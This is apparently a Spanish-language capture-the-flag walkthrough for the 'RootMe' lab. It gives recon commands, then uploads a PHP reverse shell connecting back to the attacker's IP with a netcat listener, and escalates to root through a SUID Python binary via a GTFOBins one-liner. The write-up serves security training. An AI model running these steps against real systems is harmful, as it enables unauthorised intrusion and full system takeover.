# RootMe - Guía Rápida de Pasos y Comandos
IP: 10.10.XXX.XXX

## 1. Reconocimiento

*   Realiza un escaneo inicial de puertos y servicios:
    ```bash
    nmap -sV $TARGET
    ```
*   Ejecuta un escaneo más detallado con enumeración mediante scripts, guardando la salida:
    ```bash
    nmap -sC -sV -oA rootme.txt $TARGET
    ```
*   Descubre directorios web para encontrar puntos de subida:
    ```bash
    gobuster dir --url http://10.10.XXX.XXX/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
    ```
    *(Esto debería identificar un panel de subida y el directorio `/uploads/`)*

## 2. Obteniendo una Shell

*   Prepara una reverse shell en PHP (de PentestMonkey: [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)).
*   Actualiza el script de la shell con tu IP de `tun0` y el puerto `1234`.
*   Sube la shell a través del panel web.
*   Inicia un listener:
    ```bash
    nc -l -v -n -p 1234
    ```
*   Activa la shell accediendo al archivo subido en `/uploads/`.
*   Mejora la shell básica:
    ```bash
    python -c "import pty; pty.spawn('/bin/bash')"
    ```
*   Encuentra la bandera de usuario:
    ```bash
    find / -type f -name user.txt 2>/dev/null
    ```
    *(Luego usa `cat` sobre el archivo)*

## 3. Escalada de Privilegios

*   Busca binarios SUID:
    ```bash
    find / -type f -perm -4000 2>/dev/null
    ```
    *(Identifica `/usr/bin/python` como SUID)*
*   Usa GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) para el exploit SUID de Python.
*   Navega a `/usr/bin` y ejecuta:
    ```bash
    ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    ```
*   Verifica el acceso root:
    ```bash
    whoami
    ```
    *(El resultado debe ser `root`)*
*   Localiza y lee `root.txt`.
```
